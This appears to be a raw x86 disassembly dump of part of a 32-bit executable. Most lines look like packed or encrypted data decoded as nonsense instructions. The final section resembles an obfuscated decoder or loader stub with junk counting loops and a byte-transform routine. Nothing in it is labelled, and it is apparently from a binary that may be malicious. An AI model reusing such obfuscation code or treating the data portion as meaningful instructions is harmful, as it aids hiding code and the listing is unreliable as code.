  416e75:	in     eax,0xc3
  416e77:	dec    edi
  416e78:	add    ch,al
  416e7a:	imul   esi
  416e7c:	loope  0x416ee5
  416e7e:	imul   edi,DWORD PTR [eax],0xffffffea
  416e81:	(bad)  
  416e82:	xlat   BYTE PTR ds:[ebx]
  416e83:	int    0xa5
  416e85:	rcr    DWORD PTR [ebp-0x2],0x3c
  416e89:	add    ah,BYTE PTR [ecx-0x5b29352f]
  416e8f:	mov    ecx,0xf7d41468
  416e94:	in     al,0x11
  416e96:	pop    ebp
  416e97:	jmp    0xfad3:0x93bbabff
  416e9e:	js     0x416f1b
  416ea0:	xchg   edi,eax
  416ea1:	loopne 0x416e5f
  416ea3:	dec    edi
  416ea4:	retf   0xd008
  416ea7:	inc    esi
  416ea8:	(bad)  
  416ea9:	jns    0x416f0b
  416eab:	fisubr WORD PTR [edi+ecx*8-0x1a]
  416eaf:	pop    es
  416eb0:	cmp    DWORD PTR [ebx],ebp
  416eb2:	xchg   esp,eax
  416eb3:	sbb    ch,BYTE PTR [eax+0x12]
  416eb6:	or     dl,al
  416eb8:	es mov dl,0x50
  416ebb:	mov    al,0x5d
  416ebd:	adc    BYTE PTR [eax],bl
  416ebf:	into   
  416ec0:	popa   
  416ec1:	mov    ebx,0x6643ebeb
  416ec6:	std    
  416ec7:	pop    ss
  416ec8:	adc    bl,BYTE PTR [edi+0x130d32b3]
  416ece:	cmp    BYTE PTR [esi+0x45b72395],bh
  416ed4:	hlt    
  416ed5:	mov    ecx,0xb90d71e
  416eda:	das    
  416edb:	adc    DWORD PTR [edi-0x6a8189dc],ebp
  416ee1:	add    BYTE PTR [ecx],ah
  416ee3:	inc    ebx
  416ee4:	int    0x56
  416ee6:	jb     0x416f0a
  416ee8:	test   DWORD PTR [edi+edx*2],esp
  416eeb:	fwait
  416eec:	or     DWORD PTR [edx+0x3c],edx
  416eef:	sub    DWORD PTR [ebx-0x80],eax
  416ef2:	pop    esp
  416ef3:	rol    BYTE PTR [edx-0x47],0x9
  416ef7:	cmp    BYTE PTR [ecx-0x74],dl
  416efa:	cmp    DWORD PTR [esi-0x63],esp
  416efd:	push   edx
  416efe:	dec    ebp
  416eff:	imul   DWORD PTR [edi-0x7df27006]
  416f05:	or     DWORD PTR [eax],0x4045d3c9
  416f0b:	sub    ah,cl
  416f0d:	cld    
  416f0e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f10:	dec    ebx
  416f11:	stos   DWORD PTR es:[edi],eax
  416f12:	add    eax,DWORD PTR [ebx]
  416f14:	mov    cl,0xe7
  416f16:	fadd   DWORD PTR [edx-0x42]
  416f19:	xchg   DWORD PTR [edi+0x35],ebx
  416f1c:	add    al,0x69
  416f1e:	push   0x9474ebd0
  416f23:	lds    edi,FWORD PTR [edx]
  416f25:	les    ecx,FWORD PTR [esi]
  416f27:	(bad)  
  416f28:	nop
  416f29:	in     eax,dx
  416f2a:	mov    dl,0x71
  416f2c:	dec    ebp
  416f2d:	aad    0x75
  416f2f:	push   ebx
  416f30:	push   ds
  416f31:	push   ebx
  416f32:	sbb    al,0xcd
  416f34:	mov    ebp,0xc7496629
  416f39:	cmp    dl,bh
  416f3b:	pop    ebx
  416f3c:	xchg   edi,ecx
  416f3e:	fcomp  DWORD PTR [ebx]
  416f40:	and    al,0x36
  416f42:	xor    DWORD PTR [ebx],edx
  416f44:	jmp    0x25bb:0xb7f90ef2
  416f4b:	adc    eax,0xdb5fb63b
  416f50:	loop   0x416f85
  416f52:	push   edi
  416f53:	dec    esp
  416f54:	add    al,0x1e
  416f56:	add    al,0xa8
  416f58:	ins    BYTE PTR es:[edi],dx
  416f59:	data16 jg 0x416f65
  416f5c:	stos   DWORD PTR es:[edi],eax
  416f5d:	iret   
  416f5e:	in     eax,0xe
  416f60:	add    edx,0xffffff96
  416f63:	shl    BYTE PTR [ebx+0x32aa4ead],1
  416f69:	cld    
  416f6a:	test   BYTE PTR [eax+esi*4],ah
  416f6d:	pop    esi
  416f6e:	sub    bl,0xc5
  416f71:	cwde   
  416f72:	and    al,0x1c
  416f74:	push   ecx
  416f75:	lods   eax,DWORD PTR ds:[esi]
  416f76:	jns    0x416fa8
  416f78:	bound  ecx,QWORD PTR [ebx-0x5b3e0daf]
  416f7e:	xchg   ebx,eax
  416f7f:	fwait
  416f80:	call   0xee28e051
  416f85:	(bad)  
  416f87:	shr    DWORD PTR [edx],0xe1
  416f8a:	sbb    eax,0x46e71f0f
  416f8f:	inc    esp
  416f90:	pop    eax
  416f91:	rcl    BYTE PTR [ebp+0x1b],cl
  416f94:	stc    
  416f95:	xlat   BYTE PTR ds:[ebx]
  416f96:	fwait
  416f97:	rcr    BYTE PTR [eax],1
  416f99:	push   ss
  416f9a:	mov    eax,ds:0x757c76a9
  416f9f:	xchg   edi,eax
  416fa0:	lds    edi,FWORD PTR [edx+0x9]
  416fa3:	fcmovu st,st(4)
  416fa5:	xchg   ecx,eax
  416fa6:	mov    dh,0xd1
  416fa8:	sbb    esi,DWORD PTR [edi+esi*1+0x159e62b2]
  416faf:	xchg   ebp,eax
  416fb0:	jecxz  0x41702c
  416fb2:	sbb    BYTE PTR [ecx],ch
  416fb4:	call   0x67500e9e
  416fb9:	dec    esi
  416fba:	cmp    al,0x41
  416fbc:	dec    edi
  416fbd:	inc    ebp
  416fbe:	imul   ebx,DWORD PTR [ecx+0xf],0xc1c0f9ac
  416fc5:	xor    ebp,DWORD PTR [eax-0x1c67328]
  416fcb:	hlt    
  416fcc:	outs   dx,BYTE PTR ds:[esi]
  416fcd:	fwait
  416fce:	addr16 ss (bad) 
  416fd1:	scas   eax,DWORD PTR es:[edi]
  416fd2:	daa    
  416fd3:	lods   al,BYTE PTR ds:[esi]
  416fd4:	(bad)  
  416fd5:	xor    eax,0x429c757e
  416fda:	and    BYTE PTR [ebx-0x7e721c99],bh
  416fe0:	stos   DWORD PTR es:[edi],eax
  416fe1:	push   ecx
  416fe2:	mov    dh,0x7c
  416fe4:	out    dx,al
  416fe5:	cli    
  416fe6:	pop    eax
  416fe7:	jecxz  0x417016
  416fe9:	rcr    DWORD PTR [edi+0x304f4975],cl
  416fef:	cmp    al,0x35
  416ff1:	outs   dx,BYTE PTR ds:[esi]
  416ff2:	add    esp,ebx
  416ff4:	inc    ecx
  416ff5:	mov    bh,0x22
  416ff7:	mov    es,ecx
  416ff9:	fadd   DWORD PTR [ebp-0x2d7b931a]
  416fff:	outs   dx,BYTE PTR ds:[esi]
  417000:	pop    ecx
  417001:	repnz (bad) 
  417003:	iret   
  417004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417005:	aas    
  417006:	mov    dh,0xd3
  417008:	cmp    BYTE PTR [ecx+0x232977f4],dh
  41700e:	outs   dx,DWORD PTR ds:[esi]
  41700f:	xor    al,0xdf
  417011:	and    BYTE PTR [ecx-0x1c5cafe5],ch
  417017:	sbb    eax,0x9b20849b
  41701c:	sub    dh,dl
  41701e:	sbb    bh,dl
  417020:	pushf  
  417021:	push   0x1e
  417023:	stos   BYTE PTR es:[edi],al
  417024:	iret   
  417025:	inc    edx
  417026:	jns    0x416fc1
  417028:	xchg   esi,eax
  417029:	sbb    eax,0xc064d980
  41702e:	ret    0x2a3b
  417031:	bound  edx,QWORD PTR [edx+eiz*4+0x3]
  417035:	jecxz  0x4170af
  417037:	test   DWORD PTR [ebx-0x75],ecx
  41703a:	add    eax,0xa6e60e8d
  41703f:	imul   ebx,DWORD PTR [esi+0x71],0x4c0ab3fa
  417046:	push   ss
  417047:	pushf  
  417048:	push   eax
  417049:	pop    esp
  41704a:	or     ah,BYTE PTR [ebp+0x2a]
  41704d:	sar    DWORD PTR [edx+0x3693762],0xc6
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x3d3dfbb],edx
  41706d:	sbb    eax,0x787f2b45
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x416ffd
  417077:	sub    eax,0x5dc1902b
  41707c:	or     cl,cl
  41707e:	push   ds
  41707f:	sti    
  417080:	jno    0x4170db
  417082:	mov    ecx,0x380ab02d
  417087:	pop    eax
  417088:	inc    eax
  417089:	sahf   
  41708a:	and    edi,DWORD PTR [eax]
  41708c:	pusha  
  41708d:	fxch   st(7)
  41708f:	dec    ebx
  417090:	mov    eax,0x4b2247c6
  417095:	call   0x539a:0x9f61df2
  41709c:	inc    ecx
  41709d:	jl     0x41702d
  41709f:	jae    0x417058
  4170a1:	pmovmskb ebx,mm5
  4170a4:	ja     0x41709f
  4170a6:	in     eax,dx
  4170a7:	cmp    DWORD PTR [ecx-0x30d274ad],edx
  4170ad:	mov    ah,0xf3
  4170af:	xor    al,0xb1
  4170b1:	cmp    dl,BYTE PTR [eax-0x2bd081da]
  4170b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170b8:	into   
  4170b9:	jp     0x4170c6
  4170bb:	cmc    
  4170bc:	mov    DWORD PTR [ecx],edx
  4170be:	cmp    BYTE PTR [edi-0x70bfaed7],0x9e
  4170c5:	fmul   DWORD PTR [ebp+0x78]
  4170c8:	iret   
  4170c9:	dec    esi
  4170ca:	sahf   
  4170cb:	xchg   bx,bp
  4170ce:	or     DWORD PTR [ebx+ecx*1+0x5f39e1e0],ebp
  4170d5:	mov    WORD PTR [esp+edi*2-0x73],gs
  4170d9:	std    
  4170da:	stos   BYTE PTR es:[edi],al
  4170db:	pop    eax
  4170dc:	dec    edx
  4170dd:	lahf   
  4170de:	das    
  4170df:	jmp    0x5c6ff1d2
  4170e4:	push   ss
  4170e5:	hlt    
  4170e6:	int    0xe2
  4170e8:	aad    0x8c
  4170ea:	lock shl bl,0xbd
  4170ee:	xchg   esp,eax
  4170ef:	test   eax,0xf29147d6
  4170f4:	sbb    cl,ch
  4170f6:	out    dx,al
  4170f7:	push   es
  4170f8:	test   DWORD PTR [edi-0x73c0b860],0x96ee776b
  417102:	loop   0x417144
  417104:	dec    ecx
  417105:	push   ebp
  417106:	rcr    edi,1
  417108:	xor    esi,DWORD PTR [edi-0x156810]
  41710e:	xor    DWORD PTR gs:[ebx+edi*2-0x77],ebx
  417113:	dec    edi
  417114:	pop    esp
  417115:	fs imul BYTE PTR cs:[edi-0x105ec6e3]
  41711d:	daa    
  41711e:	clc    
  41711f:	mov    ah,0xbb
  417121:	and    DWORD PTR [esi],0xffffff9e
  417124:	or     BYTE PTR [ecx+0xc],dh
  417127:	and    al,BYTE PTR [edi]
  417129:	pop    eax
  41712a:	icebp  
  41712b:	jb     0x417171
  41712d:	cmp    ebp,edx
  41712f:	cdq    
  417130:	out    dx,al
  417131:	out    dx,eax
  417132:	cld    
  417133:	inc    ecx
  417134:	and    edx,DWORD PTR [edx]
  417136:	mov    bl,0x5f
  417138:	pop    ebx
  417139:	mov    eax,0xc6583ebe
  41713e:	sbb    DWORD PTR [edi],esi
  417140:	hlt    
  417141:	add    ebp,0xffffffee
  417144:	sar    cl,cl
  417146:	mov    cl,0x4f
  417148:	es test eax,0xfe17fce0
  41714e:	into   
  41714f:	inc    ebp
  417150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417151:	in     al,0x26
  417153:	inc    edi
  417154:	fs jl  0x41712d
  417157:	and    DWORD PTR [ebx-0x4e10593],esp
  41715d:	mov    cl,0xcc
  41715f:	ss or  eax,0xc68dca27
  417165:	bound  eax,QWORD PTR [edx]
  417167:	push   0xffffffe8
  417169:	mov    eax,?
  41716b:	test   BYTE PTR [edx+0x6292d67b],al
  417171:	mov    bh,0xe9
  417173:	jge    0x4171d1
  417175:	cmp    eax,0xd973bced
  41717a:	cmp    al,BYTE PTR [ecx-0x57e03322]
  417180:	ds pop es
  417182:	call   0x30d9:0xdd102e76
  417189:	cs pop ebx
  41718b:	in     al,0x53
  41718d:	aaa    
  41718e:	test   al,0x6b
  417190:	frstor [edi+0x9eb2bc5]
  417196:	pop    ss
  417197:	jne    0x4171ab
  417199:	imul   dh
  41719b:	adc    al,0xfb
  41719d:	ins    DWORD PTR es:[edi],dx
  41719e:	addr16 ret 
  4171a0:	retf   0xd50a
  4171a3:	out    dx,al
  4171a4:	mov    ebp,0x3e5b8c6f
  4171a9:	adc    DWORD PTR [ebx+0x38],edi
  4171ac:	lea    edi,[eax]
  4171ae:	mov    esi,0xe29b66
  4171b3:	mov    bl,BYTE PTR [eax+0x40b62b81]
  4171b9:	and    dl,BYTE PTR [ebx-0x12]
  4171bc:	call   0xc4b6:0xb486e81f
  4171c3:	sub    DWORD PTR [eax+0x4f],eax
  4171c6:	fwait
  4171c7:	mul    DWORD PTR [edi-0x61]
  4171ca:	mov    ecx,DWORD PTR [eax]
  4171cc:	dec    eax
  4171cd:	repnz sbb ch,dl
  4171d0:	mov    WORD PTR ds:0xfcc735a2,ss
  4171d6:	mov    eax,ds:0xc0babf88
  4171db:	gs popf 
  4171dd:	ret    
  4171de:	stos   DWORD PTR es:[edi],eax
  4171df:	jmp    0x9fdc:0x2c800b06
  4171e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171e7:	xlat   BYTE PTR ds:[ebx]
  4171e8:	icebp  
  4171e9:	and    BYTE PTR [edx+0x223b6ae8],0x35
  4171f0:	sub    eax,DWORD PTR [edi+eiz*2]
  4171f3:	pop    ebp
  4171f4:	pop    edi
  4171f5:	inc    ecx
  4171f6:	stc    
  4171f7:	in     eax,0x3a
  4171f9:	or     ch,BYTE PTR [esi]
  4171fb:	fdiv   st(3),st
  4171fd:	inc    eax
  4171fe:	repz or al,0x50
  417201:	lds    edi,FWORD PTR [eax-0x143f0080]
  417207:	adc    BYTE PTR [ebx],ah
  417209:	add    edx,ecx
  41720b:	jp     0x417194
  41720d:	dec    ecx
  41720e:	scas   al,BYTE PTR es:[edi]
  41720f:	(bad)  
  417210:	mov    ebp,0x9e918fb4
  417215:	cmp    al,0x8d
  417217:	and    BYTE PTR [eax+0xeec18b],0xb2
  41721e:	ins    DWORD PTR es:[edi],dx
  41721f:	or     al,0x70
  417221:	mov    dl,0x85
  417223:	push   edi
  417224:	adc    ecx,esi
  417226:	mov    eax,ds:0xb5acd840
  41722b:	jmp    FWORD PTR [edi-0x79]
  41722e:	dec    ebx
  41722f:	dec    eax
  417230:	sub    al,0xd
  417232:	push   ebp
  417234:	pushf  
  417235:	into   
  417236:	xor    BYTE PTR [esi],bh
  417238:	(bad)  
  417239:	(bad)  
  41723a:	out    dx,eax
  41723b:	jge    0x4171f7
  41723d:	pushf  
  41723e:	cmp    DWORD PTR [ebx],ebx
  417240:	(bad)  
  417241:	push   0xffffffa4
  417243:	dec    ebx
  417244:	mov    DWORD PTR [ebp-0x594986d9],esp
  41724a:	jnp    0x41720b
  41724c:	sub    eax,edx
  41724e:	(bad)  
  41724f:	fsubr  st,st(1)
  417251:	jmp    0xd90b577
  417256:	test   al,0x37
  417258:	inc    eax
  417259:	imul   ecx,DWORD PTR [ebx-0x3f004040],0xffffffab
  417260:	cld    
  417261:	mov    ch,0x69
  417263:	sub    BYTE PTR ds:0xe4e42e60,dh
  417269:	sub    ch,dl
  41726b:	cmp    edi,DWORD PTR [esp+ebp*8-0x6fc46654]
  417272:	mov    edi,0x6b882c1f
  417277:	lods   eax,DWORD PTR ds:[esi]
  417278:	ja     0x417256
  41727a:	jne    0x4172d0
  41727c:	pop    esi
  41727d:	fs dec esp
  41727f:	arpl   WORD PTR [ecx-0x4a],dx
  417282:	mov    edx,0x54eca45f
  417287:	pop    es
  417288:	or     dh,BYTE PTR [edx+0x2c3e2aff]
  41728e:	dec    edi
  41728f:	push   ss
  417290:	call   0xa78e:0xf70b7d42
  417297:	xor    al,0xc
  417299:	mov    esp,0xf8aaf44
  41729e:	retf   
  41729f:	pop    eax
  4172a0:	pop    es
  4172a1:	mov    cl,0xe6
  4172a3:	int    0xde
  4172a5:	test   eax,0xd4cd7c3d
  4172aa:	and    eax,0xf1e0185a
  4172af:	(bad)  
  4172b0:	repz adc DWORD PTR [edi+0x73],esp
  4172b4:	mov    esp,0x37c595c
  4172b9:	jae    0x41726c
  4172bb:	sbb    BYTE PTR [edi+0x45],bh
  4172be:	xor    BYTE PTR [eax+0x8],0x4e
  4172c2:	stos   BYTE PTR es:[edi],al
  4172c3:	dec    BYTE PTR [esi+0x659377d7]
  4172c9:	lock xor DWORD PTR [ecx],ebx
  4172cc:	outs   dx,BYTE PTR ds:[esi]
  4172cd:	pop    eax
  4172ce:	xchg   edi,eax
  4172cf:	jp     0x417293
  4172d1:	arpl   WORD PTR [ecx],cx
  4172d3:	icebp  
  4172d4:	loop   0x41733c
  4172d6:	or     BYTE PTR [ebx],cl
  4172d8:	aas    
  4172d9:	xchg   esp,eax
  4172da:	ror    DWORD PTR [edx+eax*4-0x7b],1
  4172de:	xor    DWORD PTR [ebx],edi
  4172e0:	pop    esp
  4172e1:	pop    ecx
  4172e2:	retf   
  4172e3:	mov    ah,0x8d
  4172e5:	push   ecx
  4172e6:	mov    ebx,0x2a554e2b
  4172eb:	daa    
  4172ec:	adc    BYTE PTR [ebp+0x4ea3babc],dl
  4172f2:	xchg   esi,eax
  4172f3:	xor    al,0x8c
  4172f5:	retf   
  4172f6:	(bad)  
  4172f7:	int    0xc1
  4172f9:	adc    eax,0x897a6c42
  4172fe:	test   al,0x7d
  417300:	pop    ss
  417301:	je     0x4172d4
  417303:	xchg   esi,eax
  417304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417305:	push   ecx
  417306:	adc    al,0xdd
  417308:	inc    ebx
  417309:	mov    dh,0xf6
  41730b:	(bad)  
  41730c:	inc    edi
  41730d:	retf   0xe0dd
  417310:	dec    esi
  417311:	push   DWORD PTR [ebp-0x8]
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rol    BYTE PTR [ebx],1
  417334:	add    al,0x10
  417336:	(bad)  
  417337:	loop   0x417361
  417339:	jg     0x4173b3
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x417388
  417340:	push   ebx
  417341:	mov    esi,0x4b8979d2
  417346:	add    ah,bl
  417348:	xchg   esi,eax
  417349:	adc    BYTE PTR [edi],bh
  41734b:	imul   esi,edi,0x430d967e
  417351:	pop    esp
  417352:	and    dh,BYTE PTR [eax]
  417354:	and    al,0x7f
  417356:	inc    esp
  417357:	jns    0x417380
  417359:	cmp    BYTE PTR [esi+0x43211223],0x9a
  417360:	movd   DWORD PTR [ebp-0x4f],mm5
  417364:	jo     0x4173a3
  417366:	fisttp QWORD PTR [ecx-0x3dd7e4d9]
  41736c:	or     BYTE PTR [esi+0x65093521],0x40
  417373:	scas   eax,DWORD PTR es:[edi]
  417374:	sub    BYTE PTR [ebx+esi*1-0x2d],ah
  417378:	mov    eax,ss
  41737a:	imul   ebp,DWORD PTR [ebx+0xb],0xffffffbd
  41737e:	or     DWORD PTR [eax-0x2e],0x5e
  417382:	(bad)  
  417384:	xchg   esi,eax
  417385:	into   
  417386:	jmp    0x7e11:0xfb750b99
  41738d:	sub    dl,dl
  41738f:	das    
  417390:	mov    DWORD PTR [eax+0x6d3dc6e0],edx
  417396:	fdiv   st(2),st
  417398:	adc    eax,0xe04e4fe9
  41739d:	push   0xe58cb930
  4173a2:	in     eax,dx
  4173a3:	mov    ebp,0xf141424f
  4173a8:	adc    al,0x1e
  4173aa:	ror    BYTE PTR [edx+0x67a2df02],0xe8
  4173b1:	sub    eax,0xca5d53ce
  4173b6:	ror    BYTE PTR [esi+0x1b],1
  4173b9:	sbb    BYTE PTR [edx-0x21],0xca
  4173bd:	rol    BYTE PTR [ecx-0x23ecda4a],1
  4173c3:	pop    ds
  4173c4:	lock mov WORD PTR [eax+esi*2+0xb62818d],?
  4173cc:	cmp    BYTE PTR [eax],0xa6
  4173cf:	jle    0x4173b5
  4173d1:	loopne 0x4173eb
  4173d3:	jne    0x4173a8
  4173d5:	aam    0x32
  4173d7:	mov    ch,0xc5
  4173d9:	add    eax,0xe9accf5f
  4173de:	ret    
  4173df:	mov    ecx,0xba1b4b9b
  4173e4:	push   esi
  4173e5:	fcmovbe st,st(2)
  4173e7:	hlt    
  4173e8:	fdivr  st(6),st
  4173ea:	inc    edi
  4173eb:	aad    0xae
  4173ed:	jmp    0x60b3:0x1e9179e5
  4173f4:	nop
  4173f5:	push   edi
  4173f6:	and    BYTE PTR [esi],ah
  4173f8:	sbb    eax,0xa7b9b3e0
  4173fd:	jne    0x417412
  4173ff:	call   0xa7a8:0x40bdda56
  417406:	inc    esp
  417407:	adc    BYTE PTR [eax+0x583dec31],ah
  41740d:	push   cs
  41740e:	out    0xbf,al
  417410:	ficomp DWORD PTR [edx-0x56726451]
  417416:	ret    0x95ca
  417419:	hlt    
  41741a:	lods   al,BYTE PTR ds:[esi]
  41741b:	sub    DWORD PTR [eax+0x8],edx
  41741e:	lahf   
  41741f:	sbb    ebx,esi
  417421:	test   eax,0xc8519753
  417426:	js     0x4173ac
  417428:	pop    ds
  417429:	aas    
  41742a:	sbb    cl,dh
  41742c:	stos   BYTE PTR es:[edi],al
  41742d:	(bad)  
  41742e:	and    eax,ebx
  417430:	in     eax,0x9d
  417432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417433:	inc    esi
  417434:	das    
  417435:	repnz into 
  417437:	adc    DWORD PTR [edx],esi
  417439:	fcmovu st,st(0)
  41743b:	dec    ebp
  41743c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41743d:	dec    esi
  41743e:	shl    BYTE PTR [eax-0x2b],0x43
  417442:	or     eax,0x86dcf796
  417447:	jmp    0xf12c:0x52a09f42
  41744e:	xchg   bl,bl
  417450:	pop    edx
  417451:	test   eax,0x2f79c3e6
  417456:	iret   
  417457:	sbb    BYTE PTR [ebx],bl
  417459:	enter  0x7042,0x53
  41745d:	ficomp DWORD PTR [esp+eax*1]
  417460:	push   eax
  417461:	mov    ds:0xb9b76b45,al
  417466:	xchg   BYTE PTR [eax+0x5a],cl
  417469:	xchg   edx,eax
  41746a:	ins    DWORD PTR es:[edi],dx
  41746b:	mov    esp,DWORD PTR [edx]
  41746d:	jl     0x4173f9
  41746f:	cmp    ebp,ecx
  417471:	ins    DWORD PTR es:[edi],dx
  417472:	not    BYTE PTR [ebp+0x5]
  417475:	fidivr DWORD PTR [ebx+0x2c]
  417478:	inc    ecx
  417479:	adc    ebx,DWORD PTR [ebx]
  41747b:	nop
  41747c:	jb     0x417429
  41747e:	xor    ebx,esp
  417480:	popa   
  417481:	xor    al,0x84
  417483:	jo     0x417437
  417485:	rcl    BYTE PTR [esi+edi*1-0xbef2dca],1
  41748c:	call   0xe52a:0x7b1ff9d7
  417493:	mov    cl,bl
  417495:	pusha  
  417496:	add    ecx,edx
  417498:	std    
  417499:	pop    ss
  41749a:	pop    edx
  41749b:	fnop   
  41749d:	mov    al,ds:0x9eeaa52c
  4174a2:	std    
  4174a3:	lods   eax,DWORD PTR ds:[esi]
  4174a4:	les    esp,FWORD PTR [ebp-0x6b6b72e1]
  4174aa:	add    BYTE PTR [esi-0x7c305fc0],0xc3
  4174b1:	test   DWORD PTR [eax+0x6a3c8fef],0xbbde4289
  4174bb:	push   ecx
  4174bc:	js     0x417534
  4174be:	inc    ecx
  4174bf:	or     al,0xb8
  4174c1:	inc    ecx
  4174c2:	fsubr  QWORD PTR [edx+ebp*2]
  4174c5:	adc    bh,al
  4174c7:	in     eax,dx
  4174c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174c9:	aad    0xc4
  4174cb:	sub    DWORD PTR [edi-0x1],0x3e314630
  4174d2:	iret   
  4174d3:	inc    ecx
  4174d4:	sub    ebp,DWORD PTR [edx+0x18]
  4174d7:	pop    ss
  4174d8:	mov    ah,0x11
  4174da:	dec    ebx
  4174db:	or     ebx,DWORD PTR [ecx]
  4174dd:	ret    
  4174de:	dec    edx
  4174df:	out    0x6,eax
  4174e1:	push   ds
  4174e2:	out    0xa5,eax
  4174e4:	mov    edi,0x3c873640
  4174e9:	mov    bl,0x88
  4174eb:	or     BYTE PTR [ebx-0x8],0x9d
  4174ef:	mov    eax,ds:0x8f206c90
  4174f4:	stos   BYTE PTR es:[edi],al
  4174f5:	lods   al,BYTE PTR ds:[esi]
  4174f6:	test   BYTE PTR [edi],al
  4174f8:	inc    esi
  4174f9:	fst    QWORD PTR [ebx]
  4174fb:	cld    
  4174fc:	or     bl,BYTE PTR [ecx+0x3681cb6]
  417502:	pop    edx
  417503:	mov    ch,0x5c
  417505:	jl     0x417537
  417507:	fmul   st,st(0)
  417509:	xor    eax,0x6e23f5f8
  41750e:	mov    edi,0x8fbc060d
  417513:	add    cl,ch
  417515:	mov    ch,0x58
  417517:	push   edi
  417518:	std    
  417519:	dec    ecx
  41751a:	lods   eax,DWORD PTR ds:[esi]
  41751b:	xor    al,0xbf
  41751d:	and    eax,0x64eada51
  417522:	xor    eax,0x8d1e8d42
  417527:	aaa    
  417528:	imul   ch
  41752a:	fbstp  TBYTE PTR [ecx+edx*1+0x38cba71f]
  417531:	mov    ecx,0x20e40e9
  417536:	je     0x4174d6
  417538:	push   esp
  417539:	pop    ebx
  41753a:	cs mov ebx,0xdc7ebb6d
  417540:	psrld  mm7,mm1
  417543:	jle    0x4175c4
  417545:	fmul   st(7),st
  417547:	(bad)  
  417548:	cmc    
  417549:	xchg   edx,eax
  41754a:	sub    eax,0xc9492ee7
  41754f:	fnstsw WORD PTR [ebx-0x23]
  417552:	adc    BYTE PTR [edi+esi*4],al
  417555:	jmp    0xb076:0x576abe2a
  41755c:	mov    dh,0x5
  41755e:	or     DWORD PTR [ebx+0x28],edi
  417561:	jl     0x417568
  417563:	mov    fs,WORD PTR [ebp+0x715d88fd]
  417569:	adc    al,0x6d
  41756b:	mov    dh,0x1a
  41756d:	or     DWORD PTR [edx+0x21],0xffffffc5
  417571:	call   DWORD PTR [ebx]
  417573:	lods   al,BYTE PTR ds:[esi]
  417574:	pop    ebx
  417575:	fucomi st,st(3)
  417577:	jecxz  0x4175c3
  417579:	jl     0x417542
  41757b:	mov    bh,al
  41757d:	(bad)  
  41757e:	sub    al,0x74
  417580:	cmp    esi,DWORD PTR [ebx]
  417582:	loopne 0x4175f6
  417584:	int    0x55
  417586:	fistp  QWORD PTR [eax]
  417588:	add    cl,ch
  41758a:	push   edi
  41758b:	out    dx,eax
  41758c:	jb     0x4175c5
  41758e:	clc    
  41758f:	repnz sub DWORD PTR [ebx-0x2a1c8d1e],eax
  417596:	dec    eax
  417597:	repnz lds edx,FWORD PTR [ebx-0x2fea0db]
  41759e:	ins    BYTE PTR es:[edi],dx
  41759f:	fdivr  QWORD PTR [eax-0x537b8f20]
  4175a5:	mov    edx,0xf01b54b2
  4175aa:	fld    DWORD PTR [edi+0x1668b451]
  4175b0:	loop   0x41757d
  4175b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b3:	sbb    DWORD PTR [esi+0x6777b4f6],esp
  4175b9:	in     al,dx
  4175ba:	mov    edx,0x9c3b4d52
  4175bf:	xchg   edi,eax
  4175c0:	lods   eax,DWORD PTR ds:[esi]
  4175c1:	data16 adc al,0x8d
  4175c4:	push   edi
  4175c5:	fwait
  4175c6:	xchg   ebx,eax
  4175c7:	call   0xffc4:0xfda492d3
  4175ce:	pop    ebp
  4175cf:	mov    ds:0x65b7dbcd,al
  4175d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175d5:	sbb    eax,0x2ffac2f1
  4175da:	add    eax,esi
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a899,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a899,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a899,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7d9
  41760e:	push   0x42a825
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a972
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a899,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a899
  417633:	dec    eax
  417634:	mov    ds:0x42a899,eax
  417639:	mov    eax,ds:0x42a899
  41763e:	dec    eax
  41763f:	mov    ds:0x42a899,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a82d,0x0
  41765b:	mov    eax,ds:0x42a82d
  417660:	inc    eax
  417661:	mov    ds:0x42a82d,eax
  417666:	cmp    DWORD PTR ds:0x42a82d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42ab12
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a82d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
